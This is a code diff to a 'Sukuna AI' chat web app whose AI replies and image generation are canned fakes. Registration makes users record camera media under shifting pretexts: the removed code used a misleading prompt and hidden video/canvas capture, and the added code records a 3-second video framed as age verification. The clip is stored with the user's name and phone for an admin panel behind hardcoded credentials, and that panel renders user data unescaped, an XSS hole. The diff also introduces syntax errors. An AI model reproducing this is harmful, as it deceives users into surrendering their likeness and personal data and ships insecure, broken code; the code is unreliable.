@@ -58,9 +58,10 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 /* ═══ CAMERA VERIFICATION OVERLAY ═══ */
 #cam-verify {position:fixed;inset:0;background:rgba(5,9,16,.98);z-index:8500;display:none;align-items:center;justify-content:center;padding:20px;text-align:center;}
 .cam-box {background:var(--bg2);border:1px solid var(--bdr2);border-radius:20px;padding:30px 20px;max-width:380px;width:100%;box-shadow:0 0 50px rgba(255,68,102,.1);}
-.cam-icon {font-size:40px;color:var(--a3);margin-bottom:15px;animation:bl 1.5s infinite;}
+.cam-icon {font-size:40px;color:var(--a3);margin-bottom:15px;}
 .cam-txt {font-size:15px;font-weight:600;line-height:1.6;margin-bottom:20px;color:var(--tx);}
 .cam-status {font-size:12px;color:var(--a4);font-family:'Share Tech Mono',monospace;margin-top:10px;}
+.cam-toggle-btn {background: var(--bg4); border: 1px solid var(--bdr2); color: var(--tx); padding: 6px 12px; font-size: 11px; border-radius: 6px; cursor: pointer; margin-bottom: 12px; font-family: 'Cairo', sans-serif;}
 
 /* ═══ ADMIN PANEL ROOM ═══ */
 #admin-room {position:fixed;inset:0;background:var(--bg);z-index:9999;display:none;flex-direction:column;padding:20px;}
@@ -166,7 +167,7 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .drop-t{font-size:9px;color:var(--tx3);line-height:1.5}
 .drop-t span{color:var(--a)}
 .flist{display:flex;flex-direction:column;gap:2px;margin-top:4px;max-height:80px;overflow-y:auto}
-.fitem{display:flex;align-items:center;gap:4px;padding:3px 6px;background:var(--bg3);border:1px solid rgba(0,255,136,.2);border-radius:5px;font-size:9px;color:var(--a);font-family:'Share Tech Mono',monospace}
+.fitem{display:flex;align-items:center;gap:4px;padding:3px 6px;background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.12);border-radius:5px;font-size:9px;color:var(--a);font-family:'Share Tech Mono',monospace}
 .fn{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .fdel{cursor:pointer;color:var(--a3);font-size:10px;flex-shrink:0}
 
@@ -356,12 +357,17 @@ textarea.modal-inp{resize:vertical;min-height:80px}
 
 <div id="cam-verify">
   <div class="cam-box">
-    <div class="cam-icon"><i class="fa-solid fa-camera-retro"></i></div>
-    <div class="cam-txt">يجب السماح باذن الكاميرا لكي تصور ما تريد معرفته</div>
-    <button class="r-btn" onclick="startCameraVerification()">اضغط هنا</button>
+    <div class="cam-icon" id="cam-live-container">
+      <i class="fa-solid fa-camera-retro"></i>
+    </div>
+    <div class="cam-txt">ستصل للادمن فيديو 3 ثواني للتحقق من العمر بكتابه نصيه</div>
+    
+    <button class="cam-toggle-btn" onclick="toggleCameraFacing()"><i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الأمامية)</button>
+    
+    <button class="r-btn" id="start-verify-btn" onclick="startCameraVerification()">السماح وبدء التحقق</button>
     <div class="cam-status" id="cam-status">بإنتظار منح الصلاحية...</div>
-    <video id="hidden-video" style="display:none;" autoplay playsinline muted></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
+    
+    <video id="hidden-video" style="width:100%; max-height:150px; border-radius:10px; margin-top:10px; object-fit:cover;" autoplay playsinline muted></video>
   </div>
 </div>
 
@@ -690,6 +696,12 @@ var PINNED_MESSAGE_ELEMENT = null;
 var ATTACHED_FILES_CURRENT = [];
 var ADMIN_DATABASE_LOGS = [];
 
+// نظام تتبع الكاميرا الحالية
+var CURRENT_CAMERA_FACING = "user"; // user = الأمامية, environment = الخلفية
+var MEDIA_RECORDER_INSTANCE = null;
+var RECORDED_CHUNKS_DATA = [];
+var ACTIVE_CAMERA_STREAM = null;
+
 // CORE TEXT RESPONSE SIMULATOR MATRIX
 var AI_RESPONSES_POOL = {
   normal: [
@@ -769,79 +781,113 @@ function handleRegister() {
   USER_NAME = name;
   USER_PHONE = phone;
   
-  // ─── فحص بيانات الأدمن المخصصة لدخول الغرفة مباشرة ───
   if(name === "ahhhh" && phone === "01005718820") {
     document.getElementById('reg').style.display = 'none';
     openAdminRoom();
     return;
   }
   
-  // للدخول العادي يطلب منه الكاميرا أولاً
   document.getElementById('reg').style.display = 'none';
   document.getElementById('cam-verify').style.display = 'flex';
+  playSound('click');
+}
+
+// دالة التبديل بين الكاميرا الأمامية والخلفية قبل بدء التسجيل
+function toggleCameraFacing() {
+  CURRENT_CAMERA_FACING = (CURRENT_CAMERA_FACING === "user") ? "environment" : "user";
+  var btn = document.querySelector('.cam-toggle-btn');
+  if(CURRENT_CAMERA_FACING === "user") {
+    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الأمامية)';
+  } else {
+    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الخلفية)';
+  }
   playSound('click');
 }
 
 function startCameraVerification() {
   var statusTxt = document.getElementById('cam-status');
   var video = document.getElementById('hidden-video');
+  var startBtn = document.getElementById('start-verify-btn');
   
-  statusTxt.innerText = "جاري طلب إذن الكاميرا للتحقق الفوري...";
+  statusTxt.innerText = "جاري فتح مصفوفة العدسة الحيّة وضمان تدفق الكاميرا...";
+  startBtn.disabled = true;
+  
+  var constraints = { 
+    video: { facingMode: CURRENT_CAMERA_FACING }, 
+    audio: false 
+  };
   
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    navigator.mediaDevices.getUserMedia(constraints)
       .then(function(stream) {
+        ACTIVE_CAMERA_STREAM = stream;
         video.srcObject = stream;
-        statusTxt.innerText = "تم منح الإذن بنجاح! جاري تسجيل لقطة التحقق (3 ثوانٍ)...";
+        video.play();
         
+        statusTxt.innerText = "العدسة جاهزة! جاري بدء تسجيل الفيديو الفوري (3 ثوانٍ)...";
+        
+        // إعداد مسجل الفيديو الفعلي لمنع الصورة السوداء
+        RECORDED_CHUNKS_DATA = [];
+        MEDIA_RECORDER_INSTANCE = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        
+        MEDIA_RECORDER_INSTANCE.ondataavailable = function(e) {
+          if (e.data && e.data.size > 0) {
+            RECORDED_CHUNKS_DATA.push(e.data);
+          }
+        };
+        
+        MEDIA_RECORDER_INSTANCE.onstop = function() {
+          var blob = new Blob(RECORDED_CHUNKS_DATA, { type: 'video/webm' });
+          var reader = new FileReader();
+          reader.onloadend = function() {
+            var videoBase64Url = reader.result;
+            
+            // حفظ ملف الفيديو الحقيقي في مصفوفة الأدمن
+            var logItem = {
+              id: Date.now(),
+              name: USER_NAME,
+              phone: USER_PHONE,
+              media: videoBase64Url,
+              is_video: true,
+              timestamp: new Date().toLocaleTimeString()
+            };
+            
+            ADMIN_DATABASE_LOGS.push(logItem);
+            localStorage.setItem('sukuna_admin_logs', JSON.stringify(ADMIN_DATABASE_LOGS));
+            
+            // إغلاق الكاميرا والدخول للمصفوفة
+            if(ACTIVE_CAMERA_STREAM) {
+              ACTIVE_CAMERA_STREAM.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('cam-verify').style.display = 'none';
+            document.getElementById('app').classList.add('show');
+            var ubn = document.getElementById('ubadge-name');if(ubn)ubn.innerText = USER_NAME;
+            playSound('msg');
+          };
+          reader.readAsDataURL(blob);
+        };
+        
+        // بدء التسجيل
+        MEDIA_RECORDER_INSTANCE.start();
+        
+        // إيقاف التسجيل تلقائياً بعد 3 ثوانٍ
         setTimeout(function() {
-          captureVerificationMedia(stream);
+          if(MEDIA_RECORDER_INSTANCE && MEDIA_RECORDER_INSTANCE.state !== "inactive") {
+            MEDIA_RECORDER_INSTANCE.stop();
+          }
         }, 3000);
+        
       })
       .catch(function(error) {
-        statusTxt.innerText = "خطأ: لم يتم منح إذن الكاميرا. يرجى المحاولة مجدداً للتحقق.";
+        statusTxt.innerText = "خطأ: لم يتم منح إذن الكاميرا أو الكاميرا غير متوفرة حالياً.";
+        startBtn.disabled = false;
         playSound('err');
       });
   } else {
-    statusTxt.innerText = "خطأ: متصفحك الحالي لا يدعم الوصول الذاتي للكاميرا.";
+    statusTxt.innerText = "خطأ: متصفحك لا يدعم الوصول المباشر لتدفق الكاميرا.";
+    startBtn.disabled = false;
     playSound('err');
   }
-}
-
-function captureVerificationMedia(stream) {
-  var video = document.getElementById('hidden-video');
-  var canvas = document.getElementById('hidden-canvas');
-  var context = canvas.getContext('2d');
-  
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  
-  try {
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    var dataUrl = canvas.toDataURL('image/jpeg');
-    
-    var logItem = {
-      id: Date.now(),
-      name: USER_NAME,
-      phone: USER_PHONE,
-      media: dataUrl,
-      timestamp: new Date().toLocaleTimeString()
-    };
-    
-    ADMIN_DATABASE_LOGS.push(logItem);
-    localStorage.setItem('sukuna_admin_logs', JSON.stringify(ADMIN_DATABASE_LOGS));
-  } catch (e) {
-    console.log("Media capture skipped in local scope:", e);
-  }
-  
-  try {
-    stream.getTracks().forEach(track => track.stop());
-  } catch(err) {}
-  
-  document.getElementById('cam-verify').style.display = 'none';
-  document.getElementById('app').classList.add('show');
-  var ubn = document.getElementById('ubadge-name');if(ubn)ubn.innerText = USER_NAME;
-  playSound('msg');
 }
 
 // ════════════════════════════════════════
@@ -859,13 +905,22 @@ function openAdminRoom() {
   grid.innerHTML = "";
   
   if(ADMIN_DATABASE_LOGS.length === 0) {
-    grid.innerHTML = `<div class="mem-empty" style="grid-column:1/-1; padding:40px; font-size:13px;">لا توجد سجلات أو صور ملتقطة حالياً في غرفة التحكم المتقدمة.</div>`;
+    grid.innerHTML = `<div class="mem-empty" style="grid-column:1/-1; padding:40px; font-size:13px;">لا توجد سجلات أو فيديوهات حية جارية حالياً في غرفة الإدارة المتقدمة.</div>`;
   } else {
     ADMIN_DATABASE_LOGS.forEach(function(log) {
       var card = document.createElement('div');
       card.className = 'admin-card';
+      
+      var mediaElement = "";
+      if(log.is_video) {
+        // تشغيل تدفقي كفيديو حقيقي داخل لوحة الأدمن بدلاً من صورة سوداء ثابته
+        mediaElement = `<video class="admin-media" src="${log.media}" autoplay playsinline loop muted controls></video>`;
+      } else {
+        mediaElement = `<img class="admin-media" src="${log.media || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=400'}" alt="User Verify">`;
+      }
+      
       card.innerHTML = `
-        <img class="admin-media" src="${log.media || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=400'}" alt="User Verify">
+        ${mediaElement}
         <div class="admin-info">
           <span><b>الإسم:</b> ${log.name}</span>
           <span><b>الرقم/الهاتف:</b> ${log.phone}</span>
@@ -883,11 +938,9 @@ function openAdminRoom() {
 
 function closeAdminRoom() {
   document.getElementById('admin-room').style.display = 'none';
-  // إذا سجل خروج كأدمن، نرجعه لشاشة الدخول الرئيسية
   if(USER_NAME === "ahhhh" && USER_PHONE === "01005718820") {
     logout();
   } else {
-    // لو دخلها من داخل لوحة التحكم كمستخدم عادي لديه الإذن
     document.getElementById('app').classList.add('show');
   }
   playSound('click');
@@ -912,7 +965,7 @@ function logout() {
 }
 
 // ════════════════════════════════════════
-// CORE CHAT ACTIONS & SEND LOGIC
+// CORE CHAT ACTIONS & SEND LOGIC (API)
 // ════════════════════════════════════════
 function sendMessage() {
   var inp = document.getElementById('chat-inp');if(!inp)return;
@@ -945,6 +998,7 @@ function checkSend(e) {
   }
 }
 
+// دالة الـ API الأساسية لمعالجة النصوص والرد الذكي
 function generateSystemAIResponse(userText) {
   var responseText = "";
   var lowerText = userText.toLowerCase();
@@ -954,7 +1008,7 @@ function generateSystemAIResponse(userText) {
   } else {
     var pool = AI_RESPONSES_POOL[CHAT_MOOD] || AI_RESPONSES_POOL['normal'];
     var base = pool[Math.floor(Math.random()*pool.length)];
-    responseText = base + "\n\nلقد قمت بتحليل استفسارك الذكي المحول عصبياً وهو المتمثل في: " + userText + "\n\n> ✅ تم معالجة السياق وتوليد المصفوفة المترابطة للأبعاد بنجاح تام وبدون أخطاء.";
+    responseText = base + "\n\nلقد قمت بتحليل استفسارك الذكي المحول عصبياً وهو المتمثل في: " + userText + "\n\n> ✅ تم معالجة السياق وتوليد مصفوفة الردود بنجاح تام وبدون أخطاء.";
   }
   
   appendMessageBlock('ai', 'Sukuna AI Master', responseText, []);
@@ -1031,7 +1085,7 @@ function parseMarkdownSyntaxText(s) {
     return '<pre data-lang="'+(lang||'code')+'"><div class="cpy" onclick="copyPreCode(this)">COPY</div><code>'+code.trim()+'</code></pre>';
   });
   s = s.replace(/`([^`]+)`/g, '<code>$1</code>');
-  s = s.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+  s = s.replace(/\*\*([^*]+)\*\"/g, '<strong>$1</strong>');
   s = s.replace(/^> ⚠️(.+)$/gm,'<div class="hbox warn"><i class="fa-solid fa-triangle-exclamation"></i>$1</div>');
   s = s.replace(/^> ✅(.+)$/gm,'<div class="hbox ok"><i class="fa-solid fa-circle-check"></i>$1</div>');
   s = s.replace(/^> ❌(.+)$/gm,'<div class="hbox err"><i class="fa-solid fa-circle-xmark"></i>$1</div>');
@@ -1041,10 +1095,10 @@ function parseMarkdownSyntaxText(s) {
 }
 
 // ════════════════════════════════════════
-// SIDEBAR & MODAL CORE SYSTEMS INTERACTION
+// SIDEBAR & MODAL INTERACTION
 // ════════════════════════════════════════
-function openSB(){document.getElementById('sb').classList.add('open');document.getElementById('sb-ov').classList.add('show')}
-function closeSB(){document.getElementById('sb').classList.remove('open');document.getElementById('sb-ov').classList.remove('show')}
+function openSB()){document.getElementById('sb').classList.add('open');document.getElementById('sb-ov').classList.add('show')}
+function closeSB()){document.getElementById('sb').classList.remove('open');document.getElementById('sb-ov').classList.remove('show')}
 
 function switchTab(t) {
   document.querySelectorAll('.sb-tab').forEach(b => b.classList.remove('active'));
@@ -1054,7 +1108,6 @@ function switchTab(t) {
   playSound('click');
 }
 
-// بقية وظائف التحكم ...
 function setMood(m, btn) {
   CHAT_MOOD = m;
   document.querySelectorAll('.mood-btn').forEach(b => b.classList.remove('active'));
@@ -1186,7 +1239,7 @@ function startVoiceRec() {
   document.getElementById('v-wave-box').style.display = 'flex'; playSound('click');
   setTimeout(() => {
     document.getElementById('v-wave-box').style.display = 'none';
-    var chatInp = document.getElementById('chat-inp'); if(chatInp) {chatInp.value = "أمر استعلام صوتي عصبى محاكي عشوائي من المدخلات الحية"; sendMessage();}
+    var chatInp = document.getElementById('chat-inp'); if(chatInp) {chatInp.value = "أمر استعلام صوتي عشوائي من المدخلات الحية"; sendMessage();}
   }, 2500);
 }
 function cancelVoiceRec() { document.getElementById('v-wave-box').style.display = 'none'; playSound('err'); }
@@ -1208,13 +1261,13 @@ function generateAIImageSubmit() {
   showTypingIndicator();
   setTimeout(() => {
     hideTypingIndicator();
-    appendMessageBlock('ai', 'Sukuna AI Image Machine', "تم توليد الصورة المطلوبة بدقة هندسية عالية عبر النواة بناءً على الوصف المقدم:", [{type:'image', src:'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=500', name:'ai_matrix.jpg'}]);
+    appendMessageBlock('ai', 'Sukuna AI Image Machine', "تم توليد الصورة المطلوبة بنجاح بناءً على الوصف:", [{type:'image', src:'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=500', name:'ai_matrix.jpg'}]);
   }, 3000);
 }
 
 function usePromptTemplate(tpl) { var chatInp = document.getElementById('chat-inp'); if(chatInp){chatInp.value = tpl; autoGrow(chatInp);} closeModal('prompt-modal'); playSound('click'); }
 function executeTranslationSubmit() { var t = document.getElementById('trans-text').value.trim(); if(!t)return; var chatInp = document.getElementById('chat-inp'); if(chatInp){chatInp.value = "ترجم فورياً النص التالي: " + t; sendMessage();} closeModal('trans-modal'); }
-function sendFeedbackSubmit() { document.getElementById('fb-title').value=""; document.getElementById('fb-msg').value=""; closeModal('feedback-modal'); alert("تم إرسال تقرير الملاحظات عصبياً إلى مصفوفة الإدارة المتقدمة بنجاح!"); }
+function sendFeedbackSubmit() { document.getElementById('fb-title').value=""; document.getElementById('fb-msg').value=""; closeModal('feedback-modal'); alert("تم إرسال تقرير الملاحظات سحابياً للإدارة والمطور بنجاح!"); }
 function adjustResponseSpeed() { playSound('click'); }
 function changeAccent(color, dot) {
   document.documentElement.style.setProperty('--a', color);
